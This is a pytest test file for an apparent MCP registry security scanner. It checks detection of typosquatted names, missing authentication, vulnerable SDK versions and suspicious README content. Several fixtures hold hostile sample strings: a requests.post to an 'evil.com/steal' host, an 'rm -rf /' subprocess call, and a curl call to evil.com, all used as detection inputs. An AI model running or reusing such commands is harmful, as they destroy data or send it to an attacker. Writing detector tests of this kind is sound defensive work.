"""Tests for MCPRegistryScanner — all HTTP calls mocked.

Validates MCP registry entry fetching, security analysis (typosquatting,
missing auth, vulnerable SDK versions, suspicious content), and error
handling for network failures.
"""

from __future__ import annotations

import asyncio
from typing import Any
from unittest.mock import AsyncMock, patch

import pytest

from skillfortify.core.analyzer.models import Severity
from skillfortify.registry.base import RegistryEntry
from skillfortify.registry.mcp_registry import (
    MCPRegistryScanner,
    _parse_server_entry,
)


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


def _make_server(
    name: str = "test-server",
    url: str = "https://github.com/org/test-server",
    description: str = "A test MCP server",
    version: str = "1.0.0",
    author: str = "tester",
    **kwargs: Any,
) -> dict[str, Any]:
    """Build a mock MCP registry server entry."""
    entry: dict[str, Any] = {
        "name": name,
        "url": url,
        "description": description,
        "version": version,
        "author": author,
    }
    entry.update(kwargs)
    return entry


@pytest.fixture
def scanner() -> MCPRegistryScanner:
    """Create a scanner instance."""
    return MCPRegistryScanner()


# ---------------------------------------------------------------------------
# Helper to mock fetch_json and fetch_text
# ---------------------------------------------------------------------------


def _patch_fetch_json(return_value: Any) -> Any:
    """Patch registry.http_client.fetch_json for MCP scanner."""
    return patch(
        "skillfortify.registry.mcp_registry.fetch_json",
        new_callable=AsyncMock,
        return_value=return_value,
    )


def _patch_fetch_text(return_value: str = "") -> Any:
    """Patch registry.http_client.fetch_text for README fetching."""
    return patch(
        "skillfortify.registry.mcp_registry.fetch_text",
        new_callable=AsyncMock,
        return_value=return_value,
    )


# ---------------------------------------------------------------------------
# Tests: registry_name
# ---------------------------------------------------------------------------


class TestMCPRegistryName:
    """Tests for registry name property."""

    def test_registry_name(self, scanner: MCPRegistryScanner) -> None:
        """Scanner reports correct registry name."""
        assert scanner.registry_name == "MCP Registry"


# ---------------------------------------------------------------------------
# Tests: fetch_entries
# ---------------------------------------------------------------------------


class TestFetchEntries:
    """Tests for MCPRegistryScanner.fetch_entries."""

    def test_fetch_entries_list_format(self, scanner: MCPRegistryScanner) -> None:
        """Handles registry as a JSON array."""
        servers = [_make_server(name="server-a"), _make_server(name="server-b")]
        with _patch_fetch_json(servers):
            entries = asyncio.run(scanner.fetch_entries(limit=10))
        assert len(entries) == 2
        assert entries[0].name == "server-a"

    def test_fetch_entries_dict_format(self, scanner: MCPRegistryScanner) -> None:
        """Handles registry wrapped in {"servers": [...]}."""
        servers = {"servers": [_make_server(name="wrapped")]}
        with _patch_fetch_json(servers):
            entries = asyncio.run(scanner.fetch_entries(limit=10))
        assert len(entries) == 1
        assert entries[0].name == "wrapped"

    def test_fetch_entries_respects_limit(self, scanner: MCPRegistryScanner) -> None:
        """Returns at most 'limit' entries."""
        servers = [_make_server(name=f"s-{i}") for i in range(20)]
        with _patch_fetch_json(servers):
            entries = asyncio.run(scanner.fetch_entries(limit=5))
        assert len(entries) == 5

    def test_fetch_entries_keyword_filter(self, scanner: MCPRegistryScanner) -> None:
        """Keyword filter narrows results."""
        servers = [
            _make_server(name="mcp-database", description="Database server"),
            _make_server(name="mcp-filesystem", description="File server"),
        ]
        with _patch_fetch_json(servers):
            entries = asyncio.run(
                scanner.fetch_entries(limit=10, keyword="database")
            )
        assert len(entries) == 1
        assert entries[0].name == "mcp-database"

    def test_fetch_entries_empty_response(self, scanner: MCPRegistryScanner) -> None:
        """Empty response returns empty list."""
        with _patch_fetch_json({}):
            entries = asyncio.run(scanner.fetch_entries())
        assert entries == []

    def test_fetch_entries_malformed_items_skipped(
        self, scanner: MCPRegistryScanner
    ) -> None:
        """Malformed items (missing name) are silently skipped."""
        servers = [{"description": "no name"}, _make_server(name="valid")]
        with _patch_fetch_json(servers):
            entries = asyncio.run(scanner.fetch_entries())
        assert len(entries) == 1
        assert entries[0].name == "valid"

    def test_fetch_entries_non_dict_items_skipped(
        self, scanner: MCPRegistryScanner
    ) -> None:
        """Non-dict items in list are skipped."""
        servers = ["string-item", 42, _make_server(name="ok")]
        with _patch_fetch_json(servers):
            entries = asyncio.run(scanner.fetch_entries())
        assert len(entries) == 1


# ---------------------------------------------------------------------------
# Tests: scan_entry
# ---------------------------------------------------------------------------


class TestScanEntry:
    """Tests for MCPRegistryScanner.scan_entry."""

    def test_safe_entry(self, scanner: MCPRegistryScanner) -> None:
        """Clean entry produces no findings."""
        entry = RegistryEntry(
            name="clean-server",
            url="https://example.com/clean",
            description="A safe server",
            version="1.0.0",
        )
        with _patch_fetch_text(""):
            result = asyncio.run(scanner.scan_entry(entry))
        assert result.is_safe
        assert result.skill_name == "mcp:clean-server"

    def test_typosquatting_detection(self, scanner: MCPRegistryScanner) -> None:
        """Typosquatting indicator in name triggers CRITICAL."""
        entry = RegistryEntry(
            name="modlecontext-server",
            url="https://example.com",
            description="",
        )
        with _patch_fetch_text(""):
            result = asyncio.run(scanner.scan_entry(entry))
        assert not result.is_safe
        critical = [f for f in result.findings if f.severity == Severity.CRITICAL]
        assert len(critical) >= 1
        assert any("typosquatting" in f.attack_class for f in result.findings)

    def test_missing_auth_detection(self, scanner: MCPRegistryScanner) -> None:
        """Missing auth indicator in description triggers HIGH."""
        entry = RegistryEntry(
            name="open-server",
            url="https://example.com",
            description="This server requires no authentication for access",
        )
        with _patch_fetch_text(""):
            result = asyncio.run(scanner.scan_entry(entry))
        assert not result.is_safe
        assert any(
            f.attack_class == "missing_authentication" for f in result.findings
        )

    def test_vulnerable_sdk_version(self, scanner: MCPRegistryScanner) -> None:
        """Known-vulnerable SDK version triggers CRITICAL."""
        entry = RegistryEntry(
            name="old-server",
            url="https://example.com",
            description="",
            version="0.1.0",
        )
        with _patch_fetch_text(""):
            result = asyncio.run(scanner.scan_entry(entry))
        assert not result.is_safe
        vuln_findings = [
            f for f in result.findings if f.attack_class == "vulnerable_dependency"
        ]
        assert len(vuln_findings) == 1
        assert "CVE-2026-25253" in vuln_findings[0].message

    def test_safe_sdk_version(self, scanner: MCPRegistryScanner) -> None:
        """Safe SDK version produces no version findings."""
        entry = RegistryEntry(
            name="modern-server",
            url="https://example.com",
            description="",
            version="1.2.0",
        )
        with _patch_fetch_text(""):
            result = asyncio.run(scanner.scan_entry(entry))
        vuln = [f for f in result.findings if f.attack_class == "vulnerable_dependency"]
        assert len(vuln) == 0

    def test_readme_exfiltration_pattern(self, scanner: MCPRegistryScanner) -> None:
        """Exfiltration pattern in README triggers CRITICAL."""
        entry = RegistryEntry(
            name="exfil-server",
            url="https://github.com/evil/server",
            description="",
        )
        readme = 'import requests\nrequests.post("https://evil.com/steal")'
        with _patch_fetch_text(readme):
            result = asyncio.run(scanner.scan_entry(entry))
        assert not result.is_safe
        assert any(f.attack_class == "data_exfiltration" for f in result.findings)

    def test_readme_privesc_pattern(self, scanner: MCPRegistryScanner) -> None:
        """Privilege escalation in README triggers CRITICAL."""
        entry = RegistryEntry(
            name="privesc-server",
            url="https://github.com/bad/server",
            description="",
        )
        readme = "subprocess.run(['rm', '-rf', '/'])"
        with _patch_fetch_text(readme):
            result = asyncio.run(scanner.scan_entry(entry))
        assert not result.is_safe
        assert any(
            f.attack_class == "privilege_escalation" for f in result.findings
        )

    def test_non_github_url_skips_readme(self, scanner: MCPRegistryScanner) -> None:
        """Non-GitHub URLs skip README fetching entirely."""
        entry = RegistryEntry(
            name="custom-server",
            url="https://custom-host.com/server",
            description="",
        )
        with _patch_fetch_text(""):
            result = asyncio.run(scanner.scan_entry(entry))
        assert result.is_safe

    def test_description_content_scan(self, scanner: MCPRegistryScanner) -> None:
        """Suspicious patterns in description are detected."""
        entry = RegistryEntry(
            name="sus-server",
            url="https://example.com",
            description="uses base64.b64encode to send data",
        )
        with _patch_fetch_text(""):
            result = asyncio.run(scanner.scan_entry(entry))
        assert not result.is_safe

    def test_multiple_findings_aggregated(self, scanner: MCPRegistryScanner) -> None:
        """Multiple issues on one entry produce multiple findings."""
        entry = RegistryEntry(
            name="modlecontext-bad",  # typosquatting
            url="https://github.com/evil/repo",
            description="no authentication required",  # missing auth
            version="0.1.0",  # vulnerable SDK
        )
        readme = "subprocess.Popen(['curl', 'evil.com'])"  # privesc
        with _patch_fetch_text(readme):
            result = asyncio.run(scanner.scan_entry(entry))
        assert not result.is_safe
        assert len(result.findings) >= 3


# ---------------------------------------------------------------------------
# Tests: _parse_server_entry
# ---------------------------------------------------------------------------


class TestParseServerEntry:
    """Tests for the internal _parse_server_entry helper."""

    def test_valid_entry(self) -> None:
        """Standard entry parses correctly."""
        item = _make_server(name="good", stars=100)
        entry = _parse_server_entry(item)
        assert entry is not None
        assert entry.name == "good"
        assert entry.stars == 100

    def test_entry_with_id_fallback(self) -> None:
        """'id' is used if 'name' is absent."""
        item = {"id": "fallback-id", "url": "https://x.com"}
        entry = _parse_server_entry(item)
        assert entry is not None
        assert entry.name == "fallback-id"

    def test_none_on_missing_name(self) -> None:
        """Returns None if both name and id are missing."""
        assert _parse_server_entry({}) is None

    def test_none_on_non_dict(self) -> None:
        """Returns None for non-dict input."""
        assert _parse_server_entry("string") is None
        assert _parse_server_entry(42) is None
        assert _parse_server_entry(None) is None


# ---------------------------------------------------------------------------
# Tests: scan_registry end-to-end (mocked HTTP)
# ---------------------------------------------------------------------------


class TestScanRegistryE2E:
    """End-to-end tests for the full scan_registry flow."""

    def test_full_scan_with_mix(self, scanner: MCPRegistryScanner) -> None:
        """Full scan with a mix of safe and unsafe entries."""
        servers = [
            _make_server(name="safe-one", version="1.0.0"),
            _make_server(name="bad-one", version="0.1.0"),  # vulnerable
        ]
        with _patch_fetch_json(servers), _patch_fetch_text(""):
            results, stats = asyncio.run(scanner.scan_registry(limit=10))
        assert stats.scanned == 2
        assert stats.safe == 1
        assert stats.unsafe == 1

    def test_full_scan_empty_registry(self, scanner: MCPRegistryScanner) -> None:
        """Empty registry produces zero results."""
        with _patch_fetch_json([]):
            results, stats = asyncio.run(scanner.scan_registry())
        assert len(results) == 0
        assert stats.total_entries == 0
